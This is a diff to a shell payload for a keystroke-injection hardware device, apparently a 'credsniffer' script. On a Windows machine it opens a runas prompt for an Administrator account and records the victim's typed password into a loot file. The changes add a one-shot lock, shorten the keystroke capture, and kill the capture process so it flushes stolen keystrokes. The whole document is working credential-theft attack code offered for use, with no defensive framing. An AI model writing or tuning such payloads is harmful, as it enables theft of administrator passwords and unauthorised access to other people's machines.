@@ -18,6 +18,11 @@ RUNAS_USER="Administrator"     # Local or domain admin to runas as (e.g. DOMAIN\
 export DUCKY_LANG=se
 
 ####################Logging##################################################
+# One-shot lock — must be first, before any log file is created.
+# Prevents duplicate log files and re-triggering on subsequent ENTER presses.
+[ -f /tmp/creds_lock ] && exit 0
+touch /tmp/creds_lock
+
 LOG_FILE="/root/loot/credsniffer_$(date +%Y%m%d_%H%M%S).log"
 mkdir -p /root/loot
 
@@ -41,10 +46,6 @@ MATCH \[ENTER\]
 # This gives you time to unplug if you realize it's plugged into the wrong machine
 # MATCH \[ENTER\]
 # if [ $(date +%s) -gt $(($(stat -f%B /root 2>/dev/null || echo 0) + 30)) ]; then exit; fi
-
-# One-shot lock — exit immediately if already running or already completed this session
-[ -f /tmp/creds_lock ] && exit 0
-touch /tmp/creds_lock
 
 log INFO "STEP 1: Trigger fired — one-shot lock acquired, cleaning old loot"
 rm -f /root/loot/win-pass*
@@ -71,7 +72,7 @@ Q DELAY 1200
 # NEXT 50 is enough: password (up to ~40 chars) + ENTER
 # Capture happens now as user types into the runas console password field
 log INFO "STEP 3: Starting SAVEKEYS capture (50 keys, background)"
-SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
+SAVEKEYS /root/loot/win-pass.txt NEXT 10 &
 echo $! > /tmp/savekeys.pid
 log INFO "STEP 3: SAVEKEYS started (pid=$(cat /tmp/savekeys.pid)) — waiting for user to type password into runas console"
 
@@ -81,6 +82,13 @@ for i in {1..60}; do
     [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
     sleep 0.5
 done
+
+# If still no file, kill SAVEKEYS to force it to flush whatever it captured
+if [ ! -f /root/loot/win-pass.txt ]; then
+    log INFO "STEP 4: Poll timed out — killing SAVEKEYS (pid=$(cat /tmp/savekeys.pid 2>/dev/null)) to force flush"
+    kill "$(cat /tmp/savekeys.pid 2>/dev/null)" 2>/dev/null
+    sleep 1
+fi
 
 # Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
 if [ ! -f /root/loot/win-pass.txt ]; then
